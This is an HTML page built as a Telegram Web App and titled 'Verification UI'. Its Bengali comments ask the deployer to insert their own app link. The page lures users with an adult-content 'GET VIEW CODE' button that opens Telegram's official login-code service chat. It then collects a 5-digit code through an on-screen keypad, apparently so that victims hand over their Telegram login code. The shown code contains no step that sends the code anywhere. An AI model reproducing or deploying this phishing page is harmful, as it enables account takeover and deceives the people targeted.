<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification UI</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0; padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://w0.peakpx.com/wallpaper/348/443/HD-wallpaper-woman-blurred-background.jpg');
            background-size: cover; background-position: center;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; color: white; overflow: hidden;
        }
        .card {
            background: rgba(255, 255, 255, 0.25);
            backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px);
            border: 1px solid rgba(255, 255, 255, 0.3);
            padding: 30px 20px; border-radius: 35px;
            text-align: center; width: 320px; box-shadow: 0 15px 35px rgba(0,0,0,0.4);
        }
        .instruction {
            background: rgba(255, 255, 255, 0.9); color: #222;
            font-size: 14px; padding: 12px; border-radius: 12px;
            margin-bottom: 25px; font-weight: 600;
        }
        .continue-btn {
            background: #0088cc; border: none; width: 100%; padding: 18px;
            border-radius: 12px; color: white; font-weight: bold; font-size: 18px;
            cursor: pointer; box-shadow: 0 4px 0 #006699;
        }
        .get-code-btn {
            background: #34a853; border: none; width: 100%; padding: 18px;
            border-radius: 12px; color: white; font-weight: bold; font-size: 17px;
            cursor: pointer; margin-bottom: 25px; box-shadow: 0 4px 0 #288a42;
        }
        .otp-inputs { display: flex; justify-content: space-between; margin-bottom: 25px; }
        .otp-inputs input {
            width: 48px; height: 60px; background: rgba(255, 255, 255, 0.3);
            border: 2px solid rgba(255, 255, 255, 0.5); border-radius: 12px;
            text-align: center; font-size: 26px; color: #000; font-weight: bold; outline: none;
        }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
        .key {
            background: #4caf50; padding: 15px; border-radius: 10px;
            font-size: 22px; font-weight: bold; cursor: pointer; color: white;
        }
        .key:active { background: #388e3c; }
    </style>
</head>
<body>

    <div class="card">
        <!-- Step 1: Continue Button -->
        <div id="step-1">
            <div class="instruction">Click Continue to verify your session on our secure browser.</div>
            <button class="continue-btn" onclick="goToAsolApp()">CONTINUE ➡️</button>
        </div>

        <!-- Step 2: OTP View (Initially Hidden) -->
        <div id="step-2" style="display: none;">
            <div class="instruction">Enter the 5-digit code we just sent you!</div>
            <div class="otp-inputs" id="otp-container">
                <input type="text" maxlength="1" readonly>
                <input type="text" maxlength="1" readonly>
                <input type="text" maxlength="1" readonly>
                <input type="text" maxlength="1" readonly>
                <input type="text" maxlength="1" readonly>
            </div>
            <button class="get-code-btn" onclick="openServiceChat()">🔞 GET VIEW CODE 🔞</button>
            <div class="keypad">
                <div class="key" onclick="pressKey('1')">1</div>
                <div class="key" onclick="pressKey('2')">2</div>
                <div class="key" onclick="pressKey('3')">3</div>
                <div class="key" onclick="pressKey('4')">4</div>
                <div class="key" onclick="pressKey('5')">5</div>
                <div class="key" onclick="pressKey('6')">6</div>
                <div class="key" onclick="pressKey('7')">7</div>
                <div class="key" onclick="pressKey('8')">8</div>
                <div class="key" onclick="pressKey('9')">9</div>
                <div class="key"></div>
                <div class="key" onclick="pressKey('0')">0</div>
                <div class="key" onclick="pressKey('back')">✖️</div>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();

        function goToAsolApp() {
            // আপনার আসল অ্যাপের লিংক এখানে দিন
            const asolAppUrl = "https://google.com"; 
            
            // ব্রাউজার ওপেন করবে (টেলিগ্রামের নিয়ম অনুযায়ী পপ-আপ আসবে)
            tg.openLink(asolAppUrl);

            // এরপর স্ক্রিন পরিবর্তন করবে
            document.getElementById('step-1').style.display = 'none';
            document.getElementById('step-2').style.display = 'block';
        }

        function openServiceChat() {
            window.location.assign("tg://openmessage?user_id=777000");
        }

        const inputs = document.querySelectorAll('#otp-container input');
        let currentIdx = 0;
        function pressKey(key) {
            if (key === 'back') {
                if (currentIdx >= 0) {
                    if (inputs[currentIdx].value === "" && currentIdx > 0) currentIdx--;
                    inputs[currentIdx].value = "";
                }
            } else {
                if (currentIdx < inputs.length) {
                    inputs[currentIdx].value = key;
                    if (currentIdx < inputs.length - 1) currentIdx++;
                }
            }
        }
    </script>
</body>
</html>
